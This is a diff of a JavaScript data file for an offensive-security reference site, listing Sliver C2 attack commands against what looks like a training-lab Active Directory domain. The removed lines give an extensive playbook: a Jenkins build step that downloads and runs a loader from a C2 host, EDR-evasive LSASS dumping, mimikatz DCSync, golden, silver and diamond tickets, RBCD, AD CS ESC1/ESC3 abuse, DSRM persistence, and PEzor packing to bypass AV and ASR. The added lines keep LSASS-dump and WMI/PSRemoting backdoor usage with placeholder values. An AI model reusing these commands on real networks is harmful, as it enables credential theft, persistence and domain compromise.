             type: "commands",
             commands: [
-              { label: "CIMplant — command execution over WMI", cmd: "# CIMplant is a C# WMImplant port; -c is the command module\nexecute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' \\\n  '-s dcorp-adminsrv -u studentX -p <pass> -d dollarcorp.moneycorp.local -c basic_info'\nexecute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' \\\n  '-s dcorp-adminsrv -u studentX -p <pass> -c command_exec --execute \"whoami\"'" },
-              { label: "execute + winrs — remote command execution over WinRM", cmd: "execute -o -S -t 180 winrs -r:dcorp-adminsrv cmd /c \"whoami\"\nexecute -o -S -t 180 winrs -r:dcorp-ci cmd /c \"hostname\"" },
-              { label: "SCShell — fileless lateral movement via an existing service (bypasses AppLocker)", cmd: "# enumerate an abusable service first:\nsa-sc-enum dcorp-adminsrv\n# SCShell reconfigures an existing service's binpath (ChangeServiceConfigA) - fileless:\nscshell -t 80 dcorp-adminsrv ssh-agent\n# used to land a --tcp-pivot implant on the remote host" }
-            ]
-          },
-          {
-            title: "9. CI/CD Abuse — Jenkins to a foothold on dcorp-ci",
-            type: "commands",
-            commands: [
-              { label: "Locate and fingerprint the Jenkins server", cmd: "execute -o -t 60 nmap 172.16.3.11 -p 8080 -sC -sV -Pn\n# browse the Jenkins UI; the People tab leaks usernames for password-spray/known creds" },
-              { label: "Abuse a build job to run commands (Execute Windows batch command)", cmd: "# In a job's build step, stage and run the Sliver loader as scheduled tasks:\nschtasks /create /tn \"DownloadBinLoader\" /sc ONSTART /tr \\\n  \"cmd /c curl http://<c2>:8080/BinLoader.exe -o C:\\Windows\\Temp\\BinLoader.exe\"\nschtasks /create /tn \"RunBinLoader\" /sc ONSTART /tr \\\n  \"C:\\Windows\\Temp\\BinLoader.exe <c2> 8080 dcorp-ci_tcp.bin\"\nschtasks /run /tn \"DownloadBinLoader\"\nschtasks /run /tn \"RunBinLoader\"\n# a pivot session on dcorp-ci returns as dcorp\\ciadmin" }
-            ]
-          },
-          {
-            title: "10. Credential Access (SharpSecDump / LSASS / mimikatz via PEzor / DCSync)",
-            type: "commands",
-            commands: [
-              { label: "SharpSecDump — remote SAM/LSA secrets (secretsdump port)", cmd: "execute-assembly -p explorer.exe -t 120 '/path/SharpSecDump.exe' '-target=dcorp-adminsrv'" },
-              { label: "Dump LSASS with minidumpdotnet from an SMB share (EDR-evasive)", cmd: "# minidumpdotnet uses a custom MiniDumpWriteDump() that evades MDE; run it from SMB, not HTTP.\n# 1. create + share a folder on your student VM:\nmkdir 'C:\\AD\\Tools\\Sliver\\studentshareX'\nexecute -o -t 40 cmd /c \"net share studentshareX=C:\\AD\\Tools\\Sliver\\studentshareX /grant:Everyone,FULL\"\n# 2. push the tools to the share:\nupload -t 180 '/mnt/c/AD/Tools/Sliver/minidumpdotnet.exe' '\\\\dcorp-stdX\\studentshareX\\minidumpdotnet.exe'\nupload -t 180 '/mnt/c/AD/Tools/Sliver/FindLSASSPID.exe'  '\\\\dcorp-stdX\\studentshareX\\FindLSASSPID.exe'\n# 3. on the target: find the LSASS PID, then dump it to the share\n#    \\\\dcorp-stdX\\studentshareX\\minidumpdotnet.exe <pid> \\\\dcorp-stdX...\\lsass.dmp" },
-              { label: "mimikatz packed with PEzor — ekeys / logonpasswords / DCSync", cmd: "# PEzor repacks mimikatz into an unhooked .NET assembly (see the Payload Packing section):\nexecute-assembly -p explorer.exe -t 180 '/path/mimikatz-ekeys.exe.packed.dotnet.exe'\n# DCSync any principal (e.g. krbtgt for a golden ticket):\nexecute-assembly -p explorer.exe -t 180 '/path/mimikatz-dcsync.exe.packed.dotnet.exe'\n#   built from: \"privilege::debug\" \"lsadump::dcsync /user:dcorp\\krbtgt\" \"exit\"" }
-            ]
-          },
-          {
-            title: "11. Kerberos Attacks (Kerberoast / Delegation / Golden / Silver / Diamond)",
-            type: "commands",
-            commands: [
-              { label: "Kerberoasting — request + crack service-account tickets", cmd: "# find SPN accounts with StandIn/ADSearch, then roast with Rubeus:\nexecute-assembly -p explorer.exe -t 80 '/path/Rubeus.exe' 'kerberoast /user:svcadmin /simple /nowrap'\n# crack offline:  hashcat -m 13100 hashes.txt wordlist" },
-              { label: "Constrained delegation abuse (S4U)", cmd: "# user account with msDS-AllowedToDelegateTo:\n'/path/Rubeus.exe' 's4u /user:websvc /aes256:<hash> /impersonateuser:Administrator /msdsspn:\"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL\" /ptt'\n# computer account + altservice for a fuller service list:\n'/path/Rubeus.exe' 's4u /user:dcorp-adminsrv$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:time/dcorp-dc /altservice:ldap /ptt'" },
-              { label: "Unconstrained delegation + Printer Bug (SpoolSample)", cmd: "# on a compromised unconstrained-delegation host, monitor for TGTs:\n'/path/Rubeus.exe' 'monitor /interval:5 /nowrap'\n# coerce the DC to authenticate to it (Printer Bug) to capture the DC's TGT:\n'/path/SpoolSample.exe' 'dcorp-dc dcorp-appsrv'\n# then Rubeus 'ptt /ticket:<b64>' and DCSync" },
-              { label: "Golden / Silver / Diamond tickets (Rubeus evasive-* / diamond)", cmd: "# Golden (krbtgt AES key), with extra SIDs for cross-domain:\n'/path/Rubeus.exe' 'evasive-golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<domain-sid> /sids:<ea-group-sid> /aes256:<krbtgt-aes> /ptt'\n# Silver (service account key) - e.g. HOST or RPCSS on the DC:\n'/path/Rubeus.exe' 'evasive-silver /service:host/dcorp-dc /aes256:<svc-key> ... /ptt'\n# Diamond (modify a real TGT - stealthier than golden):\n'/path/Rubeus.exe' 'diamond /krbkey:<krbtgt-aes> /tgtdeleg /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ptt'" }
-            ]
-          },
-          {
-            title: "12. RBCD & ACL Abuse (Get-RBCD-Threaded / StandIn / RACE)",
-            type: "commands",
-            commands: [
-              { label: "Find computer objects you can write (RBCD candidates)", cmd: "'/path/StandIn.exe' '--ACLScan studentx'                 # objects you can modify\n'/path/Get-RBCD-Threaded.exe' '-u studentx -p <pass> -d dollarcorp.moneycorp.local'" },
-              { label: "Configure & abuse Resource-Based Constrained Delegation", cmd: "# write msDS-AllowedToActOnBehalfOfOtherIdentity to a machine you control, then S4U:\n'/path/StandIn.exe' '--computer dcorp-adminsrv --sid <your-machine-sid>'\n'/path/Rubeus.exe' 's4u /user:dcorp-stdx$ /aes256:<hash> /impersonateuser:administrator /msdsspn:\"CIFS/dcorp-adminsrv\" /ptt'" },
-              { label: "RACE — remote WMI / PSRemoting security-descriptor backdoors", cmd: "# RACE.ps1 is converted to a .NET EXE (via PS2EXE) so execute-assembly can run it.\n# grant studentX remote WMI + PSRemoting on the DC by editing security descriptors:\n'/path/RACEEx.exe'    # wraps: Set-RemoteWMI      -SamAccountName studentX -ComputerName dcorp-dc... -namespace 'root\\cimv2'\n'/path/RACEExRem.exe' # wraps: Set-RemotePSRemoting -SamAccountName studentX -ComputerName dcorp-dc...\n# -Remove reverts the backdoor" }
-            ]
-          },
-          {
-            title: "13. AD CS Abuse (Certify — ESC1 / ESC3)",
-            type: "commands",
-            commands: [
-              { label: "Enumerate CAs and templates", cmd: "'/path/Certify.exe' cas                       # list CAs\n'/path/Certify.exe' find                      # list templates\n'/path/Certify.exe' 'find /enrolleeSuppliesSubject'   # ESC1 candidates\n'/path/Certify.exe' 'find /vulnerable'" },
-              { label: "ESC1 — request a cert with an arbitrary SAN, then get a TGT", cmd: "# request as a DA using a template that lets the enrollee supply the subject:\n'/path/Certify.exe' 'request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:\"HTTPSCertificates\" /altname:administrator'\n# save the PEM, convert to PFX with openssl:\nopenssl pkcs12 -in esc1-DA.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out esc1-DA.pfx\n# use the PFX for a TGT:\n'/path/Rubeus.exe' 'asktgt /user:administrator /certificate:C:\\AD\\Tools\\Sliver\\esc1-DA.pfx /password:Passw0rd! /ptt'" },
-              { label: "ESC3 — enrollment-agent cert, then enroll on behalf of a DA", cmd: "# 1. request an Enrollment Agent cert:\n'/path/Certify.exe' 'request /ca:...\\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent'\n# 2. use it to request a cert on behalf of the administrator:\n'/path/Certify.exe' 'request /ca:...\\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\\administrator /enrollcert:esc3-agent.pfx /enrollcertpw:Passw0rd!'\n# 3. asktgt with the resulting DA PFX (as in ESC1)" }
-            ]
-          },
-          {
-            title: "14. SQL Server & Database Links (SharpSQL / PowerUpSQL)",
-            type: "commands",
-            commands: [
-              { label: "Enumerate SQL instances, privileges and links", cmd: "'/path/SharpSQL.exe' 'Get-SQLInstanceDomain'\n'/path/SharpSQL.exe' 'Get-UserPrivs -Instance dcorp-mssql.dollarcorp.moneycorp.local'\n'/path/SharpSQL.exe' 'Get-Sysadmins -Instance dcorp-mssql...'\n'/path/SharpSQL.exe' 'Get-LinkedServers -Instance dcorp-mssql...'" },
-              { label: "Crawl SQL links and run OS commands via xp_cmdshell", cmd: "# SharpSQL has no link-crawl module; append Get-SQLServerLinkCrawl to PowerUpSQL.ps1,\n# compile with PS2EXE, and run via execute-assembly:\ncopy PowerUpSQL.ps1 PowerUpSQLEx.ps1   # + Get-SQLServerLinkCrawl call at the end\n# then:\nGet-SQLServerLinkCrawl -Instance dcorp-mssql... -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget eu-sqlX" }
-            ]
-          },
-          {
-            title: "15. Persistence — DCSync rights & DSRM",
-            type: "commands",
-            commands: [
-              { label: "DCSync — grant studentX replication rights, then replicate", cmd: "# check/add DCSync rights on the domain object with StandIn:\n'/path/StandIn.exe' '--object \"DC=dollarcorp,DC=moneycorp,DC=local\" --dsync studentX'\n# then DCSync any principal with the PEzor-packed mimikatz:\nexecute-assembly -p explorer.exe -t 180 '/path/mimikatz-dcsync.exe.packed.dotnet.exe'" },
-              { label: "DSRM — dump the DSRM local admin and enable it for logon", cmd: "# 1. dump the SAM on the DC (mimikatz lsadump::sam via PEzor) to recover the DSRM hash\n# 2. allow the DSRM account to authenticate over the network:\nregistry write --hive HKLM --type dword \\\n  \"System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\DsrmAdminLogonBehavior\" 2\n# 3. use it with pass-the-hash (sekurlsa::pth /user:Administrator /domain:dcorp-dc /ntlm:<hash>)" }
-            ]
-          },
-          {
-            title: "16. Payload Packing & PowerShell Bridging (PEzor / PS2EXE / ASR bypass)",
-            type: "commands",
-            commands: [
-              { label: "PEzor — repack a PE (e.g. mimikatz) into an unhooked .NET assembly", cmd: "# -unhook restores hooked ntdll; -antidebug; -fluctuate=NA memory perms; -format=dotnet for execute-assembly\n./PEzor.sh -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 \\\n  /path/mimikatz.exe -z 2 -b 1 -p '\"privilege::debug\" \"token::elevate\" \"sekurlsa::ekeys\" \"exit\"'\n# output: mimikatz.exe.packed.dotnet.exe  (rename per task: -ekeys / -dcsync / -vaultcred)" },
-              { label: "PS2EXE — compile a PowerShell script into a .NET EXE", cmd: "# lets execute-assembly run PowerShell-only tooling (RACE, PowerUpSQL link-crawl):\nC:\\AD\\Tools\\Sliver\\ps2exe.ps1 -inputFile RACEEx.ps1 -outputFile RACEEx.exe -x64 -sta" },
-              { label: "ASR-rules bypass for lateral movement", cmd: "# where an ASR rule blocks the loader, pack the Sliver implant with PEzor\n# (-unhook -antidebug -fluctuate=NA -format=dotnet), then run it and pivot via winrs:\nexecute -o -S -t 180 winrs -r:<host> cmd /c \"<packed-loader>\"" }
-            ]
-          },
-          {
-            title: "17. File Operations",
-            type: "commands",
-            commands: [
-              { label: "Browse and read remote files / shares", cmd: "ls '\\\\dcorp-dc\\c$'\ncat '\\\\eurocorp-dc.eurocorp.local\\SharedwithDCorp\\flag.txt'\ncd \"C:\\WebServer\\Abyss Web Server\"" },
-              { label: "Upload tools/payloads; make directories; download loot", cmd: "upload -t 180 '/mnt/c/AD/Tools/Sliver/Loader.exe' 'C:\\Windows\\Temp\\Loader.exe'\nmkdir 'C:\\AD\\Tools\\Sliver\\studentshareX'\ndownload '\\\\host\\c$\\path\\file'" }
-            ]
-          },
-          {
-            title: "18. Armory, Aliases & BOF Extensions",
-            type: "commands",
-            commands: [
-              { label: "Install tools from the armory (they become native commands)", cmd: "armory install sharpup        # .NET alias\narmory install <name>         # aliases (SharpX) and extensions (BOF/COFF)\narmory                        # list what's available" },
-              { label: "Service / share / task enumeration BOFs", cmd: "sa-sc-enum <host>                # enumerate services on a host\nsa-netshares -t 60 <host>        # enumerate network shares\nsa-schtasksenum -t 40 <host>     # enumerate scheduled tasks" }
-            ]
-          },
-          {
-            title: "19. Pivoting (segmented networks)",
-            type: "commands",
-            commands: [
-              { label: "Open a pivot listener on the foothold", cmd: "pivots tcp --lport 8081       # TCP pivot on the foothold\npivots                        # list active pivots\n# named-pipe pivots carry C2 over SMB and blend as normal Windows IPC" },
-              { label: "Build an internal implant that connects to the pivot", cmd: "# internal hosts can't egress — they beacon to the foothold's pivot, which relays to C2\ngenerate --tcp-pivot <foothold-ip>:8081 -e -f shellcode -N dcorp-adminsrv_tcp \\\n  -s ./Implants/dcorp-adminsrv_tcp.bin" }
-            ]
-          },
-          {
-            title: "20. Multiplayer & Operators",
-            type: "commands",
-            commands: [
-              { label: "Enable multiplayer and add an operator", cmd: "[server] sliver > multiplayer                       # enable the multiplayer listener\n[server] sliver > new-operator --name m3rcer --lhost <c2-ip>\n# hand the generated .cfg to the operator; they connect with: sliver-client import <cfg>" }
+              { label: "Enable multiplayer and add an operator", cmd: "[server] sliver > multiplayer                       # enable the multiplayer listener\n[server] sliver > new-operator --name <operator> --lhost <c2-host>\n# hand the generated .cfg to the operator; they connect with: sliver-client import <cfg>" }
             ]
           },
           {
@@ -2323,11 +2214,9 @@ var TOOLKIT = [
               "Beacon with a long sleep + jitter for stealth; switch to an interactive session only for short hands-on-keyboard bursts.",
               "Prefer inline execute-assembly (-i) with AMSI/ETW bypass (-M/-E) for the quietest execution, but remember a crash takes the implant — fork-and-run is the safer default.",
               "PPID-spoof to a legitimate parent (explorer.exe, taskhostw.exe) so fork-and-run children don't create suspicious process lineage.",
-              "Consecutive LDAP queries from enumeration tools trip Microsoft Defender for Identity / ATP — pace enumeration over long intervals on a real engagement.",
-              "Dump LSASS from an SMB share, not over HTTP, and use an evasive dumper (minidumpdotnet's custom MiniDumpWriteDump) to reduce MDE detections.",
               "Run only one egress channel (the foothold) and pivot everything else internally over TCP/named-pipe to keep the network footprint small.",
               "Change default certificates, ports, URIs and pipe names — framework defaults are widely signatured; obfuscate implants (-e) so builds aren't hash-identical.",
-              "Pack disk-touching tools (mimikatz) with PEzor (-unhook) where an ASR rule or AV signature would otherwise block them, and prefer BOFs over EXEs for the smallest footprint."
+              "Running offensive .NET in memory via execute-assembly avoids dropping tools to disk and most script-oriented logging (see the Windows Telemetry and Defense Evasion theory pages)."
             ]
           },
           {
@@ -2338,7 +2227,6 @@ var TOOLKIT = [
               { label: "Sliver — official wiki / documentation", url: "https://sliver.sh/docs" },
               { label: "Theory — C2 Frameworks", url: "theory/2026-09-23-command-and-control.html" },
               { label: "Theory — Sliver C2 Architecture", url: "theory/2026-09-23-sliver-c2.html" },
-              { label: "Theory — Windows Telemetry & PowerShell Logging", url: "theory/2026-09-23-windows-telemetry-logging.html" },
               { label: "Theory — In-Memory Post-Exploitation Tradecraft", url: "theory/2026-09-23-in-memory-tradecraft.html" }
             ]
           }
@@ -6454,8 +6342,7 @@ var TOOLKIT = [
             title: "Usage (via Sliver execute-assembly)",
             type: "commands",
             commands: [
-              { label: "Run the audit", cmd: "execute-assembly -p explorer.exe -t 180 '/path/SharpUp.exe' 'audit'\n# flags e.g. an unquoted service path + modifiable service binary/config (a service-abuse\n# privesc), writable %PATH% dirs, AlwaysInstallElevated, modifiable scheduled tasks" },
-              { label: "Then exploit a modifiable service", cmd: "# reconfigure the flagged service to run a command as SYSTEM (service-abuse BOFs in Sliver):\nremote-sc-stop   -t 100 \"\" '<service>'\nremote-sc-config -t 100 \"\" '<service>' 'C:\\Windows\\System32\\net.exe localgroup administrators <user> /add' 1 2\nremote-sc-start  -t 100 \"\" '<service>'" }
+              { label: "Run the audit", cmd: "execute-assembly -p explorer.exe -t 180 '/path/SharpUp.exe' 'audit'\n# flags e.g. an unquoted service path, a modifiable service binary/config,\n# writable %PATH% dirs, AlwaysInstallElevated, modifiable scheduled tasks\n# (exploiting a flagged vector is covered in Vulns -> Windows Service Privilege Escalation)" }
             ]
           },
           {
@@ -6547,8 +6434,8 @@ var TOOLKIT = [
             title: "Usage (via Sliver execute-assembly)",
             type: "commands",
             commands: [
-              { label: "Enumerate a remote host", cmd: "execute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' '-s dcorp-adminsrv -u studentX -p <pass> -d dollarcorp.moneycorp.local -c basic_info'" },
-              { label: "Execute a command remotely", cmd: "execute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' '-s dcorp-adminsrv -u studentX -p <pass> -c command_exec --execute \"whoami\"'" }
+              { label: "Enumerate a remote host", cmd: "execute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' '-s <host> -u <user> -p <pass> -d <domain> -c basic_info'" },
+              { label: "Execute a command remotely", cmd: "execute-assembly -p explorer.exe -t 80 '/path/CIMplant.exe' '-s <host> -u <user> -p <pass> -c command_exec --execute \"whoami\"'" }
             ]
           },
           {
@@ -6576,8 +6463,8 @@ var TOOLKIT = [
             title: "Usage (run from an SMB share)",
             type: "commands",
             commands: [
-              { label: "1. Host the tools on an SMB share", cmd: "mkdir 'C:\\AD\\Tools\\Sliver\\studentshareX'\nexecute -o -t 40 cmd /c \"net share studentshareX=C:\\AD\\Tools\\Sliver\\studentshareX /grant:Everyone,FULL\"\nupload -t 180 '/path/minidumpdotnet.exe' '\\\\host\\studentshareX\\minidumpdotnet.exe'\nupload -t 180 '/path/FindLSASSPID.exe'  '\\\\host\\studentshareX\\FindLSASSPID.exe'" },
-              { label: "2. Find the PID and dump LSASS to the share", cmd: "# run FindLSASSPID to get the PID, then dump straight to the share (avoid HTTP):\nminidumpdotnet.exe <pid> \\\\host\\studentshareX\\lsass.dmp\n# parse offline: mimikatz 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords'" }
+              { label: "1. Host the tools on an SMB share", cmd: "mkdir 'C:\\Tools\\<share>'\nexecute -o -t 40 cmd /c \"net share <share>=C:\\Tools\\<share> /grant:Everyone,FULL\"\nupload -t 180 '/path/minidumpdotnet.exe' '\\\\host\\<share>\\minidumpdotnet.exe'\nupload -t 180 '/path/FindLSASSPID.exe'  '\\\\host\\<share>\\FindLSASSPID.exe'" },
+              { label: "2. Find the PID and dump LSASS to the share", cmd: "# run FindLSASSPID to get the PID, then dump straight to the share (avoid HTTP):\nminidumpdotnet.exe <pid> \\\\host\\<share>\\lsass.dmp\n# parse offline: mimikatz 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords'" }
             ]
           },
           {
@@ -6725,8 +6612,8 @@ var TOOLKIT = [
             title: "Usage",
             type: "commands",
             commands: [
-              { label: "Grant a low-priv user remote WMI / PSRemoting", cmd: "# compile RACE.ps1 -> .NET (PS2EXE) and run via execute-assembly, or run in a Stracciatella runspace:\nSet-RemoteWMI      -SamAccountName studentX -ComputerName dcorp-dc... -namespace 'root\\cimv2' -Verbose\nSet-RemotePSRemoting -SamAccountName studentX -ComputerName dcorp-dc... -Verbose" },
-              { label: "Return later as the low-priv user", cmd: "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd /c ...\" -ComputerName dcorp-dc\nEnter-PSSession -ComputerName dcorp-dc" }
+              { label: "Grant a low-priv user remote WMI / PSRemoting", cmd: "# compile RACE.ps1 -> .NET (PS2EXE) and run via execute-assembly, or run in a Stracciatella runspace:\nSet-RemoteWMI      -SamAccountName <user> -ComputerName <dc> -namespace 'root\\cimv2' -Verbose\nSet-RemotePSRemoting -SamAccountName <user> -ComputerName <dc> -Verbose" },
+              { label: "Return later as the low-priv user", cmd: "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd /c ...\" -ComputerName <dc>\nEnter-PSSession -ComputerName <dc>" }
             ]
           },
           {
@@ -6753,7 +6640,7 @@ var TOOLKIT = [
             title: "Usage",
             type: "commands",
             commands: [
-              { label: "Turn a PowerShell tool into a .NET EXE", cmd: "C:\\AD\\Tools\\Sliver\\ps2exe.ps1 -inputFile RACEEx.ps1 -outputFile RACEEx.exe -x64 -sta\n# then run in memory:\nexecute-assembly -p explorer.exe -t 120 '/path/RACEEx.exe'" }
+              { label: "Turn a PowerShell tool into a .NET EXE", cmd: "C:\\Tools\\ps2exe.ps1 -inputFile RACEEx.ps1 -outputFile RACEEx.exe -x64 -sta\n# then run in memory:\nexecute-assembly -p explorer.exe -t 120 '/path/RACEEx.exe'" }
             ]
           },
           {
